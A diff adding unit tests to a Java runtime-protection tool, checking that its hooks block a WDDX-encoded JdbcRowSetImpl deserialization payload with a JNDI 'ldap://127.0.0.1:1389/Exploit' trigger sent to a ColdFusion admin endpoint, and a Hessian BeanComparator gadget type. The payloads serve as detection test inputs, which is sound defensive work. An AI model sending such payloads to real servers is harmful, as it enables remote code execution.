@@ -434,6 +434,60 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void blocksWddxTypedPayloadRequestWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-wddx-typed-payload", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+    String payload =
+        "<wddxPacket version='1.0'><header/><data>"
+            + "<struct type='xcom.sun.rowset.JdbcRowSetImplx'>"
+            + "<var name='dataSourceName'><string>ldap://127.0.0.1:1389/Exploit</string></var>"
+            + "<var name='autoCommit'><boolean value='true'/></var>"
+            + "</struct></data></wddxPacket>";
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub(
+                        "POST",
+                        "/CFIDE/adminapi/accessmanager.cfc",
+                        "method=foo&_cfclient=true")
+                    .withHeader("Content-Type", "application/x-www-form-urlencoded")
+                    .withParameter("argumentCollection", payload)));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_typed_payload_deserialization\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("parameter=argumentCollection"));
+    assertTrue(text.contains("class=com.sun.rowset.JdbcRowSetImpl"));
+    assertTrue(text.contains("trigger=jndi:ldap"));
+    assertTrue(text.contains("value=[redacted]"));
+    assertFalse(text.contains("ldap://127.0.0.1"));
+  }
+
+  @Test
+  void ignoresTypedPayloadRequestWithoutDangerousClassAndTriggerPair() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-wddx-safe", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("POST", "/CFIDE/adminapi/accessmanager.cfc", "")
+            .withParameter(
+                "argumentCollection",
+                "{\"@type\":\"com.example.SafeBean\",\"dataSourceName\":\"ldap://127.0.0.1/a\"}"));
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("POST", "/CFIDE/adminapi/accessmanager.cfc", "")
+            .withParameter(
+                "argumentCollection",
+                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"jdbc:h2:mem:test\"}"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
   void ignoresTeamCityInstallLinksFragmentPathWhenBlockModeIsEnabled() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-teamcity-installlinks", ".jsonl");
     Files.delete(log);
@@ -1185,6 +1239,34 @@ final class Java11RaspHooksTest {
     String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
     assertTrue(text.contains("\"algorithm\":\"java11_deserialization_gadget_class\""));
     assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void ignoresBenignHessianType() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-hessian-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHessianType("java.util.HashMap");
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksDangerousHessianTypeWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-hessian-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () -> Java11RaspHooks.beforeHessianType("[Lorg/apache/commons/beanutils/BeanComparator;"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_deserialization_hessian_type\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("\"class\":\"org.apache.commons.beanutils.BeanComparator\""));
   }
 
   @Test
